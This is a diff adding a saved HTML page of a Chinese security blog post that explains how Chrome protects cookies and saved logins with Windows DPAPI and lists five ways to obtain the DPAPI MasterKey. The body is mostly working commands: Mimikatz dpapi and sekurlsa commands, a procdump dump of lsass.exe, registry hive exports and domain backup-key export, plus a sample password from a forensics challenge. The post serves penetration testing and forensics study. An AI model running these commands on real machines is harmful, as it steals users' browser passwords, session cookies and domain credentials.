@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CNTF3L2LQC');
+</script>  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      chrome 浏览器cookies&amp;登陆凭据解密&amp;Windows系统下DPAPI中的MasterKey获取 - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8cookies-amp-%E7%99%BB%E9%99%86%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86-amp-Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey%E8%8E%B7%E5%8F%96"><span class="toc-text">谷歌浏览器cookies&amp;登陆凭据解密&amp;Windows系统下DPAPI中的MasterKey获取</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E3%81%AE%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-text">谷歌浏览器の加解密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95-%E7%9B%B4%E6%8E%A5%E4%BB%A5%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E7%9A%84%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E8%B0%83%E7%94%A8DPAPI%E8%A7%A3%E5%AF%86"><span class="toc-text">第一种方法 :直接以加密数据的用户身份调用DPAPI解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95-%E8%8E%B7%E5%8F%96MasterKey%E8%84%B1%E6%9C%BA%E8%A7%A3%E5%AF%86"><span class="toc-text">第二种方法 : 获取MasterKey脱机解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BFmasterkey%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-text">拿masterkey的几种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E7%9B%B4%E6%8E%A5%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E8%BF%90%E8%A1%8CMimikatz%E6%8F%90%E5%8F%96"><span class="toc-text">方法一 直接在目标机器运行Mimikatz提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E8%BD%AC%E5%82%A8lsass-exe-%E8%BF%9B%E7%A8%8B%E4%BB%8E%E5%86%85%E5%AD%98%E6%8F%90%E5%8F%96masterkey"><span class="toc-text">方法二 转储lsass.exe 进程从内存提取masterkey</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E5%AF%BC%E5%87%BASAM%E6%B3%A8%E5%86%8C%E8%A1%A8-%E6%8F%90%E5%8F%96user-hash-%E8%A7%A3%E5%AF%86masterkey%E6%96%87%E4%BB%B6"><span class="toc-text">方法三 导出SAM注册表 提取user hash 解密masterkey文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B-%E5%B7%B2%E7%9F%A5%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81-%E6%88%96hash-%E7%94%A8%E6%88%B7SID-masterkey%E8%B7%AF%E5%BE%84-%E6%8B%BF%E5%88%B0%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84masterkey%E6%96%87%E4%BB%B6"><span class="toc-text">方法四 已知用户密码(或hash) 用户SID(masterkey路径) 拿到加密后的masterkey文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94-%E9%80%9A%E8%BF%87%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%BC%E5%87%BAbackup-key-%E6%81%A2%E5%A4%8DMaster-key"><span class="toc-text">方法五 通过域管理员导出backup key 恢复Master key</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">chrome 浏览器cookies&登陆凭据解密&Windows系统下DPAPI中的MasterKey获取</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2021/05/05</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/笔记">笔记</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/笔记">笔记</a>
+                  
+                
+                  
+                    <a href="/tags/DPAPI">DPAPI</a>
+                  
+                
+                  
+                    <a href="/tags/CHROME">CHROME</a>
+                  
+                
+                  
+                    <a href="/tags/mimikatz">mimikatz</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h6 id="谷歌浏览器cookies-amp-登陆凭据解密-amp-Windows系统下DPAPI中的MasterKey获取">谷歌浏览器cookies&amp;登陆凭据解密&amp;Windows系统下DPAPI中的MasterKey获取<a class="post-anchor" href="#谷歌浏览器cookies-amp-登陆凭据解密-amp-Windows系统下DPAPI中的MasterKey获取"></a></h6><h2 id="谷歌浏览器の加解密">谷歌浏览器の加解密<a class="post-anchor" href="#谷歌浏览器の加解密"></a></h2><p>Chrome cookies 储存位置  “%localappdata%\Google\Chrome\User Data\Default\Cookies”<br>Chrome 登陆凭据 储存位置 “%localappdata%\Google\Chrome\User Data\Default\Login Data”<br> 谷歌浏览器使用了windows自带的DPAPI进行加解密操作<br> 解密方法有两种</p>
+<h3 id="第一种方法-直接以加密数据的用户身份调用DPAPI解密">第一种方法 :直接以加密数据的用户身份调用DPAPI解密<a class="post-anchor" href="#第一种方法-直接以加密数据的用户身份调用DPAPI解密"></a></h3><p>Mimikatz<br>dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Login Data” /unprotect<br>ps:如果没有目标加密文件的用户的权限 或者是想要解密机器上其他用户加密储存的信息这种方法就不能使用了</p>
+<h3 id="第二种方法-获取MasterKey脱机解密">第二种方法 : 获取MasterKey脱机解密<a class="post-anchor" href="#第二种方法-获取MasterKey脱机解密"></a></h3><p>DPAPI加密的数据需要使用MasterKey解密<br>如果可以拿到MasterKey的话就可直接解密数据<br>Mimikatz<br>dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Login Data” /unprotect /masterkey:36af83d6e6a67e4f67e6f45ca0464a031946182b3e67d72ce9c08e22d7a720b5d2a768418291f28fb79c6def7b068f84955e764e87e36c6b0b666e05fb7eb9f4</p>
+<h2 id="拿masterkey的几种方法">拿masterkey的几种方法<a class="post-anchor" href="#拿masterkey的几种方法"></a></h2><h3 id="方法一-直接在目标机器运行Mimikatz提取">方法一 直接在目标机器运行Mimikatz提取<a class="post-anchor" href="#方法一-直接在目标机器运行Mimikatz提取"></a></h3><p>privilege::debug<br>sekurlsa::dpapi<br>(需目标用户已登陆)</p>
+<h3 id="方法二-转储lsass-exe-进程从内存提取masterkey">方法二 转储lsass.exe 进程从内存提取masterkey<a class="post-anchor" href="#方法二-转储lsass-exe-进程从内存提取masterkey"></a></h3><p>如果目标用户已经登陆 lsass进程的内存中会存在masterkey 转储之 使用Mimikatz提取<br>procdump.exe -accepteula -ma lsass.exe 666.dmp<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::dpapi</p>
+<h3 id="方法三-导出SAM注册表-提取user-hash-解密masterkey文件">方法三 导出SAM注册表 提取user hash 解密masterkey文件<a class="post-anchor" href="#方法三-导出SAM注册表-提取user-hash-解密masterkey文件"></a></h3><p>需SYSTEM权限<br>reg save HKLM\SYSTEM SS.hiv<br>reg save HKLM\SECURITY SE.hiv<br>m/u 值解密Masterkey文件<br>mimikatz log “lsadump::secrets /system:SS.hiv /security:SE.hiv”<br>拿到DPAPI_SYSTEM m/u 后半部分的值 (HASH)<br>这种方法对应MASTERKEY位置在C:\Windows\System32\Microsoft\Protect\S-1-5-18\User<br>(一个个文件试总会解密成功的 现在不知道怎么获取用户对应的GUID<br>mimikatz “dpapi::masterkey /in:C:\Windows\System32\Microsoft\Protect\S-1-5-18\User{GUID} /system:HASH”<br>即可拿到masterkey</p>
+<h3 id="方法四-已知用户密码-或hash-用户SID-masterkey路径-拿到加密后的masterkey文件">方法四 已知用户密码(或hash) 用户SID(masterkey路径) 拿到加密后的masterkey文件<a class="post-anchor" href="#方法四-已知用户密码-或hash-用户SID-masterkey路径-拿到加密后的masterkey文件"></a></h3><p>这是当时 volatility内存取证题遇到的问题 这里就随手记录下来了<br>第一步<br>获取用户密码(或hash)<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/05/05/15ogAqclGnQSXRi.png" data-caption="" data-fancybox="images"><img src="https://i.loli.net/2021/05/05/15ogAqclGnQSXRi.png" alt=""></a><br>找到masterkey文件位置<br>这种方法的文件位置在C:\Users{username}\AppData\Roaming\Microsoft\Protect{SID}{GUID}<br>dpapi::masterkey /in:C:\Users\Genga03\AppData\Roaming\Microsoft\Protect\S-1-5-21-262715442-3761430816-2198621988-1001\57935170-beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:vIg*q3x6GFa5aFBA /protected<br>/password可以用/hash:密码hash代替(NTLM or SHA1)<br>即可拿到masterkey</p>
+<h3 id="方法五-通过域管理员导出backup-key-恢复Master-key">方法五 通过域管理员导出backup key 恢复Master key<a class="post-anchor" href="#方法五-通过域管理员导出backup-key-恢复Master-key"></a></h3><p>利用条件:目标机器加入域 要拿的是域用户的key 拿到域管理员权限<br>lsadump::backupkeys /system:123.com /export (需要域管理员权限)  导出domain backup key<br>dpapi::masterkey /in:”C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe” /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk<br>即可拿到masterkey</p>
+<h4 id="参考">参考<a class="post-anchor" href="#参考"></a></h4><p> <a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey">渗透技巧-获取Windows系统下DPAPI中的MasterKey</a><br>  <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials">howto-~-scheduled-tasks-credentials</a><br>   <a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c">Reading DPAPI Encrypted Secrets with Mimikatz and C++</a><br>   <a target="_blank" rel="noopener" href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">Operational Guidance for Offensive User DPAPI Abuse</a></p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2021/05/05/fastjson%E7%BB%95WAF-TIPS/">fastjson绕过WAF的TIPS</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2021/05/05/chrome-%E6%B5%8F%E8%A7%88%E5%99%A8cookies-%E7%99%BB%E9%99%86%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86-Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey%E8%8E%B7%E5%8F%96/">https://rce.moe/2021/05/05/chrome-%E6%B5%8F%E8%A7%88%E5%99%A8cookies-%E7%99%BB%E9%99%86%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86-Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey%E8%8E%B7%E5%8F%96/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2021
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
